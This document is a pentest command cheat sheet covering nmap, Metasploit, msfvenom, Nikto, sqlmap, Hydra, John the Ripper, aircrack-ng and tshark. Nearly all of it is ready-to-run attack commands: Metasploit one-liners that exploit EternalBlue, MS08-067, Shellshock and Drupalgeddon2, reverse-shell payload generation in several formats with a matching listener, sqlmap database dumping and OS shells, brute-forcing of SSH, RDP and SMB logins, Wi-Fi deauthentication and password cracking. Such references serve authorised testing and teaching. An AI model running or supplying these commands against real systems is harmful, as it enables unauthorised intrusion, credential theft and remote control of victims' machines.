# Pentest Command Reference

> Source: pentest-commands

## 1. Nmap

### Host Discovery
```bash
nmap -sP 192.168.1.0/24     # Ping sweep
nmap -sL 192.168.1.0/24     # List IPs without scanning
nmap -sn 192.168.1.0/24     # Ping scan (host discovery)
```

### Port Scanning
```bash
nmap -sS 192.168.1.1        # TCP SYN scan (stealth)
nmap -sT 192.168.1.1        # Full TCP connect scan
nmap -sU 192.168.1.1        # UDP scan
nmap -p- 192.168.1.1        # All ports (1-65535)
nmap -p 22,80,443 192.168.1.1  # Specific ports
```

### Service Detection
```bash
nmap -sV 192.168.1.1        # Service versions
nmap -O 192.168.1.1         # OS detection
nmap -A 192.168.1.1         # Comprehensive scan
nmap -Pn 192.168.1.1        # Skip host discovery
```

### NSE Scripts
```bash
nmap --script vuln 192.168.1.1                          # Vulnerability scan
nmap --script smb-enum-shares -p 445 192.168.1.1        # SMB enumeration
nmap --script http-enum -p 80 192.168.1.1               # HTTP enumeration
nmap --script smb-vuln-ms17-010 192.168.1.1             # EternalBlue check
nmap --script smb-vuln-ms08-067 192.168.1.1             # MS08-067 check
nmap --script ssh-brute -p 22 192.168.1.1               # SSH brute force
nmap --script ftp-anon 192.168.1.1                      # FTP anonymous
nmap --script dns-brute 192.168.1.1                     # DNS brute force
nmap -p80 --script http-methods 192.168.1.1             # HTTP methods
nmap -p80 --script http-headers 192.168.1.1             # HTTP headers
nmap --script http-sql-injection -p 80 192.168.1.1      # SQL injection check
```

### Advanced Scans
```bash
nmap -sX 192.168.1.1        # Xmas scan
nmap -sA 192.168.1.1        # ACK scan (firewall detection)
nmap -sW 192.168.1.1        # Window scan
nmap --traceroute 192.168.1.1  # Traceroute
```

### Quick Reference
```bash
nmap -F 192.168.1.1              # Quick scan
nmap -sV -sC -A -p- 192.168.1.1 # Full comprehensive
nmap -sV -T4 192.168.1.1        # Fast with version
```

## 2. Metasploit

### Basic Usage
```bash
msfconsole                                           # Launch
search type:exploit name:smb                         # Search exploits
use exploit/windows/smb/ms17_010_eternalblue         # Use exploit
show options                                         # Show options
set RHOST 192.168.1.1                                # Set target
set PAYLOAD windows/meterpreter/reverse_tcp          # Set payload
exploit                                              # Run
```

### Common Exploits
```bash
# EternalBlue
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.1; exploit"

# MS08-067 (Conficker)
msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; exploit"

# vsftpd backdoor
msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.1.1; exploit"

# Shellshock
msfconsole -x "use exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST 192.168.1.1; exploit"

# Drupalgeddon2
msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOST 192.168.1.1; exploit"

# PSExec
msfconsole -x "use exploit/windows/smb/psexec; set RHOST 192.168.1.1; set SMBUser user; set SMBPass pass; exploit"
```

### Scanners
```bash
# TCP port scan
msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; run"

# SMB version / share enumeration
msfconsole -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run"
msfconsole -x "use auxiliary/scanner/smb/smb_enumshares; set RHOSTS 192.168.1.0/24; run"

# SSH / FTP brute force
msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run"
msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run"

# RDP scanning
msfconsole -x "use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS 192.168.1.0/24; run"
```

### Payload Generation (msfvenom)
```bash
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf > shell.elf

# PHP
msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=4444 -f raw > shell.php

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f asp > shell.asp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f war > shell.war

# Python
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.2 LPORT=4444 -f raw > shell.py
```

### Handler Setup
```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; set LPORT 4444; exploit"
```

## 3. Nikto
```bash
nikto -h http://192.168.1.1                          # Basic scan
nikto -h http://192.168.1.1 -C all                   # Comprehensive scan
nikto -h http://192.168.1.1 -output report.html      # Output to file
nikto -h http://192.168.1.1 -Plugins robots           # Plugin: robots
nikto -h http://192.168.1.1 -Plugins shellshock        # Plugin: shellshock
nikto -h http://192.168.1.1 -Plugins heartbleed        # Plugin: heartbleed
nikto -h http://192.168.1.1 -Plugins ssl               # Plugin: ssl
nikto -h http://192.168.1.1 -Format msf+              # Export to Metasploit
nikto -h http://192.168.1.1 -Tuning 1                 # Interesting files only
```

## 4. SQLMap
```bash
sqlmap -u "http://192.168.1.1/page?id=1"                            # Basic injection test
sqlmap -u "http://192.168.1.1/page?id=1" --dbs                     # Enumerate databases
sqlmap -u "http://192.168.1.1/page?id=1" -D database --tables      # Enumerate tables
sqlmap -u "http://192.168.1.1/page?id=1" -D database -T users --dump  # Dump table
sqlmap -u "http://192.168.1.1/page?id=1" --os-shell                # OS shell
sqlmap -u "http://192.168.1.1/login" --data="user=admin&pass=test" # POST request
sqlmap -u "http://192.168.1.1/page" --cookie="id=1*"               # Cookie injection
sqlmap -u "http://192.168.1.1/page?id=1" --tamper=space2comment    # Bypass WAF
sqlmap -u "http://192.168.1.1/page?id=1" --risk=3 --level=5       # Max risk/level
```

## 5. Hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1    # SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1    # FTP
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"  # HTTP POST
hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin/           # HTTP Basic Auth
hydra -l admin -P passwords.txt smb://192.168.1.1                      # SMB
hydra -l admin -P passwords.txt rdp://192.168.1.1                      # RDP
hydra -l root -P passwords.txt mysql://192.168.1.1                     # MySQL
hydra -L users.txt -P passwords.txt ssh://192.168.1.1                  # Username list
```

## 6. John the Ripper
```bash
john hash.txt                                                    # Crack password file
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt        # With wordlist
john hash.txt --show                                             # Show cracked
john hash.txt --format=raw-md5                                   # MD5 format
john hash.txt --format=nt                                        # NTLM format
john hash.txt --format=sha512crypt                               # sha512crypt

# SSH key passphrase
ssh2john id_rsa > ssh_hash.txt && john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# ZIP password
zip2john file.zip > zip_hash.txt && john zip_hash.txt
```

## 7. Aircrack-ng (Wireless)
```bash
airmon-ng start wlan0                                              # Monitor mode
airodump-ng wlan0mon                                               # Capture packets
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon    # Target network
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon                   # Deauth attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap     # Crack WPA
```

## 8. Wireshark/Tshark
```bash
tshark -i eth0 -w capture.pcap                                    # Capture traffic
tshark -r capture.pcap                                             # Read capture
tshark -r capture.pcap -Y "http"                                   # Filter by protocol
tshark -r capture.pcap -Y "ip.addr == 192.168.1.1"                # Filter by IP
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri    # Extract HTTP data
```

## Password Hash Types

| Mode | Type |
|------|------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | sha512crypt |
| 3200 | bcrypt |
| 13100 | Kerberoast |
